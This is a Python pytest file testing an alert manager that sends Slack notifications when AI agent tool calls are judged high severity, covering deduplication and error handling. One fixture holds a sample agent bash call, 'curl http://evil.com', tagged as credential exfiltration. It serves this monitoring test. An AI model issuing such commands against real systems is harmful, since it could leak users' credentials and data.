"""Tests for alerting.py — AlertManager."""

import time
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from alerting import AlertManager, _DEDUP_WINDOW_SECONDS


# ---------------------------------------------------------------------------
# Fixtures / shared data
# ---------------------------------------------------------------------------

_HIGH_STEP = {
    "step": 1,
    "tool_call": {"tool": "bash", "args": {"command": "curl http://evil.com"}},
}

_HIGH_JUDGMENT = {
    "severity": "high",
    "rule_name": "credential_exfiltration",
    "explanation": "Possible exfiltration.",
}

_LOW_JUDGMENT = {
    "severity": "low",
    "rule_name": None,
    "explanation": "No issue.",
}

_MEDIUM_JUDGMENT = {
    "severity": "medium",
    "rule_name": "sensitive_file_access",
    "explanation": "Credential reference.",
}


@pytest.fixture
def manager(monkeypatch: pytest.MonkeyPatch) -> AlertManager:
    monkeypatch.setenv("SLACK_WEBHOOK_URL", "https://hooks.slack.com/test/webhook")
    monkeypatch.setenv("BASE_URL", "http://localhost:8000")
    return AlertManager()


@pytest.fixture
def manager_no_webhook(monkeypatch: pytest.MonkeyPatch) -> AlertManager:
    monkeypatch.delenv("SLACK_WEBHOOK_URL", raising=False)
    return AlertManager()


def _mock_http_client(post_side_effect=None):
    """Return (patcher, mock_client_instance) for patching alerting.httpx.AsyncClient."""
    mock_response = MagicMock()
    mock_response.raise_for_status = MagicMock()

    mock_instance = AsyncMock()
    if post_side_effect is not None:
        mock_instance.post = AsyncMock(side_effect=post_side_effect)
    else:
        mock_instance.post = AsyncMock(return_value=mock_response)

    return mock_instance


# ---------------------------------------------------------------------------
# No-op cases
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_send_noop_when_no_webhook(manager_no_webhook: AlertManager):
    mock_inst = _mock_http_client()
    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        await manager_no_webhook.send(_HIGH_STEP, _HIGH_JUDGMENT, 1)
    mock_inst.post.assert_not_called()


@pytest.mark.asyncio
async def test_send_noop_for_low_severity(manager: AlertManager):
    mock_inst = _mock_http_client()
    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        await manager.send(_HIGH_STEP, _LOW_JUDGMENT, 1)
    mock_inst.post.assert_not_called()


@pytest.mark.asyncio
async def test_send_noop_for_medium_severity(manager: AlertManager):
    mock_inst = _mock_http_client()
    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        await manager.send(_HIGH_STEP, _MEDIUM_JUDGMENT, 1)
    mock_inst.post.assert_not_called()


# ---------------------------------------------------------------------------
# Successful send
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_send_posts_to_webhook_url(manager: AlertManager):
    mock_inst = _mock_http_client()
    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        await manager.send(_HIGH_STEP, _HIGH_JUDGMENT, 1)

    mock_inst.post.assert_called_once()
    call_args = mock_inst.post.call_args
    assert call_args[0][0] == "https://hooks.slack.com/test/webhook"


@pytest.mark.asyncio
async def test_send_payload_contains_rule_name(manager: AlertManager):
    mock_inst = _mock_http_client()
    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        await manager.send(_HIGH_STEP, _HIGH_JUDGMENT, 42)

    payload = mock_inst.post.call_args[1]["json"]
    # Flatten all mrkdwn text values and check rule_name appears somewhere
    texts = [
        field["text"]
        for block in payload["blocks"]
        for field in (block.get("fields") or [])
        if field.get("type") == "mrkdwn"
    ]
    assert any("credential_exfiltration" in t for t in texts)


@pytest.mark.asyncio
async def test_send_payload_contains_session_link(manager: AlertManager):
    mock_inst = _mock_http_client()
    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        await manager.send(_HIGH_STEP, _HIGH_JUDGMENT, 7)

    payload = mock_inst.post.call_args[1]["json"]
    # The session link is in the last section block's text
    last_block = payload["blocks"][-1]
    assert "sessions/7" in last_block["text"]["text"]


# ---------------------------------------------------------------------------
# Deduplication
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_send_deduplicates_within_window(manager: AlertManager):
    mock_inst = _mock_http_client()
    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        await manager.send(_HIGH_STEP, _HIGH_JUDGMENT, 1)
        await manager.send(_HIGH_STEP, _HIGH_JUDGMENT, 1)

    assert mock_inst.post.call_count == 1


@pytest.mark.asyncio
async def test_send_fires_again_after_dedup_window(manager: AlertManager):
    mock_inst = _mock_http_client()
    rule_name = _HIGH_JUDGMENT["rule_name"]
    # Manually set the last-sent time to beyond the window
    manager._last_sent[rule_name] = time.monotonic() - (_DEDUP_WINDOW_SECONDS + 1)

    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        await manager.send(_HIGH_STEP, _HIGH_JUDGMENT, 1)

    mock_inst.post.assert_called_once()


# ---------------------------------------------------------------------------
# HTTP error handling
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_send_does_not_raise_on_http_error(manager: AlertManager):
    mock_inst = _mock_http_client(post_side_effect=Exception("connection timeout"))
    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        # Must not raise
        await manager.send(_HIGH_STEP, _HIGH_JUDGMENT, 1)


@pytest.mark.asyncio
async def test_send_does_not_raise_on_raise_for_status(manager: AlertManager):
    mock_response = MagicMock()
    mock_response.raise_for_status.side_effect = Exception("HTTP 500")
    mock_inst = AsyncMock()
    mock_inst.post = AsyncMock(return_value=mock_response)

    with patch("alerting.httpx.AsyncClient") as MockClient:
        MockClient.return_value.__aenter__ = AsyncMock(return_value=mock_inst)
        MockClient.return_value.__aexit__ = AsyncMock(return_value=False)
        await manager.send(_HIGH_STEP, _HIGH_JUDGMENT, 1)
